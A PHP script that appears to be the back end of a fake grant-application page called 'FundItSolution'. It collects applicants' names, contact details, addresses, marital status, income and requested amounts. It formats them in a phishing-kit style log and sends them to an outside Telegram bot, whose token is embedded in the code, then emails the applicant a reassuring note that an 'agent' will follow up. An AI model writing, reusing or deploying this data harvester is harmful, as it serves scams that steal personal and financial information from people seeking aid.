<?php

  session_start();
if (isset($_POST['submit'])) {
      $skamt = $_POST['seekingamt'];
      $fname = $_POST['fname'];
      $lname = $_POST['lname'];
      $purpose = $_POST['purpose'];
      $gender = $_POST['gender'];
      $dependant = $_POST['dependant'];
      $email = $_POST['email'];
      $phn = $_POST['phn']; 
      $mstatus = $_POST['mstatus'];
       $city = $_POST['city'];
      $addr = $_POST['addr'];
      $zip = $_POST['zip'];
      $ownerstat = $_POST['ownerstat'];
      $workind = $_POST['industry'];
      $income = $_POST['income'];

      $_SESSION['seekingamt'] = $skamt;
      $_SESSION['fname'] = $fname;
      $_SESSION['lname'] = $lname;
      $_SESSION['purpose'] = $purpose;
      $_SESSION['gender'] = $gender;
      $_SESSION['dependant'] = $dependant;
      $_SESSION['email'] = $email;
      $_SESSION['phn'] = $phn; 
      $_SESSION['mstatus'] = $mstatus;
      $_SESSION['city'] = $city;
      $_SESSION['addr'] = $addr;
      $_SESSION['zip'] = $zip;
      $_SESSION['ownerstat'] = $ownerstat;
      $_SESSION['industry'] = $workind;
      $_SESSION['income'] = $income;
      $time = date("h:i:sa");
      $date = date("d/m/Y");

      	$code = <<<EOT
============== [ Grant  | ] ==============

    [AmtNeeded] : {$_SESSION['seekingamt']}
    [Fname] : {$_SESSION['fname']}
    [Lname] : {$_SESSION['lname']}
    [GrantPurpose] : {$_SESSION['purpose']}
      [Gender] : {$_SESSION['gender']}
      [dependant] : {$_SESSION['dependant']}
      [Email] : {$_SESSION['email']}
      [phone] : {$_SESSION['phn']} 
      [mstatus] : {$_SESSION['mstatus']}
      [addr] : {$_SESSION['addr']}
      [city] : {$_SESSION['city']}
      [zip] : {$_SESSION['zip']}
      [ownerstat] : {$_SESSION['ownerstat']}
      [workindustry] : {$_SESSION['industry']}
      [income] : {$_SESSION['income']}


============= [Grant] =============
\r\n\r\n
EOT;
$msg = " echo <p>$fname $lname </p><p>Your Application is being Received and is currently on Review</p><p>Our Agent will contact you via the your email or mobile number provided for next process</p>";

  
		$subject = " Received Application";
        $headers = "From: FundItSolution <no-reply@funditsolution.com>\r\n";
        $headers .= "MIME-Version: 1.0\r\n";
        $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
		@mail($email,$subject,$msg,$headers);
   

        //admin get application result on telegram

   define ('url',"https://api.telegram.org/bot6015939481:AAELIUAIab2NxN7n5xNAvMu5YpoT/");
$message = $code;
$chat_id = '-1001444';
$message = urlencode($message);
file_get_contents(url."sendmessage?text=".$message."&chat_id=".$chat_id."&parse_mode=HTML");

//result end
}
  header("Location: https://www.funditsolution.com");

?>